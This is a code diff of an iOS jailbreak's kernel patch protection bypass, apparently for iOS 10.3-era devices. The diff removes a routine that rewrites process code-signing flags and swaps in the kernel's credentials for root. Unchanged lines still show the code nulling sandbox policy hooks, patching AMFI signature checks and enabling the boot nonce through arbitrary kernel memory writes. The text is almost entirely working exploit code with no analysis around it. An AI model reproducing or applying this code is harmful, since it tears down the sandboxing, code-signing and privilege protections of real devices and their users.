@@ -8,6 +8,7 @@
 //
 
 #include "kpp.h"
+#include "kernel.h"
 
 // @qwertyoruiop's KPP bypass
 
@@ -15,64 +16,19 @@
 #include "patchfinder64.h"
 
 
-#define CS_PLATFORM_BINARY  0x4000000    /* this is a platform binary */
-#define CS_INSTALLER        0x0000008    /* has installer entitlement */
-#define CS_GET_TASK_ALLOW   0x0000004    /* has get-task-allow entitlement */
-#define CS_RESTRICT         0x0000800    /* tell dyld to treat restricted */
-#define CS_HARD             0x0000100    /* don't load invalid pages */
-#define CS_KILL             0x0000200    /* kill process if it becomes invalid */
+//#define CS_PLATFORM_BINARY  0x4000000    /* this is a platform binary */
+//#define CS_INSTALLER        0x0000008    /* has installer entitlement */
+//#define CS_GET_TASK_ALLOW   0x0000004    /* has get-task-allow entitlement */
+//#define CS_RESTRICT         0x0000800    /* tell dyld to treat restricted */
+//#define CS_HARD             0x0000100    /* don't load invalid pages */
+//#define CS_KILL             0x0000200    /* kill process if it becomes invalid */
 
 
-uint64_t allprocs = 0x59AC60; // iPhone 6S - 10.3.2
+//uint64_t allprocs = 0x59AC60; // iPhone 6S - 10.3.2
 
 
 kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, task_t tfp0) {
     kern_return_t ret;
-    
-    uint64_t bsd_task=0;
-    uint64_t launchd_task = 0;
-    {
-        uint64_t proc = ReadAnywhere64(allprocs + kernbase);
-        NSLog(@"found procs at %llx", proc);
-        while (proc) {
-            uint32_t pid = ReadAnywhere32(proc+0x10);
-            if (pid == getpid()) {
-                bsd_task = proc;
-            } else
-                if (pid == 1) {
-                    launchd_task = proc;
-                }
-            
-            if (launchd_task && bsd_task) break;
-            
-            proc = ReadAnywhere64(proc);
-        }
-    }
-    uint64_t cred = ReadAnywhere64(bsd_task+0x100);
-    
-    uint64_t credpatch = 0;
-    uint64_t proc = bsd_task;
-    while (proc) {
-        uint32_t pid = ReadAnywhere32(proc+0x10);
-        uint32_t csflags = ReadAnywhere32(proc+0x2a8);
-        csflags |= CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
-        csflags &= ~(CS_RESTRICT|CS_KILL|CS_HARD);
-        WriteAnywhere32(proc+0x2a8, csflags);
-        if (pid == 0) {
-            credpatch = ReadAnywhere64(proc+0x100);
-            break;
-        }
-        proc = ReadAnywhere64(proc);
-    }
-
-    uint64_t orig_cred = cred;
-
-    WriteAnywhere64(bsd_task+0x100, credpatch);
-
-    checkvad();
-    
-    
-    ////////////////////
     
     checkvad();
     
@@ -384,14 +340,14 @@ remappage[remapcnt++] = (x & (~PMK));\
 
     RemapPage(release);
     if (NewPointer(release) == (NewPointer(release+11) - 11)) {
-        copyout(NewPointer(release), "SaigonARM", 11); /* saigonarm */
+        copyout(NewPointer(release), "MarijuanARM", 11); /* marijuanarm */
     }
-
-
+    
+    
     /*
      nonceenabler
      */
-
+    
     {
         uint64_t sysbootnonce = find_sysbootnonce();
         printf("[INFO]: nonce: %x\n", ReadAnywhere32(sysbootnonce));
@@ -400,7 +356,10 @@ remappage[remapcnt++] = (x & (~PMK));\
     }
 
 
-
+    /*
+     amfi
+     */
+    
     uint64_t memcmp_got = find_amfi_memcmpstub();
     uint64_t ret1 = find_ret_0();
 
@@ -411,7 +370,6 @@ remappage[remapcnt++] = (x & (~PMK));\
     printf("[INFO]: fref at %llx\n", fref);
 
     uint64_t amfiops = find_amfiops();
-
     printf("[INFO]: amfistr at %llx\n", amfiops);
 
     {
@@ -460,7 +418,8 @@ remappage[remapcnt++] = (x & (~PMK));\
         }
         fref += 4;
     }
-
+    
+    {
         /*
          sandbox
          */
@@ -504,7 +463,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);
-
+    }
 
 
     {
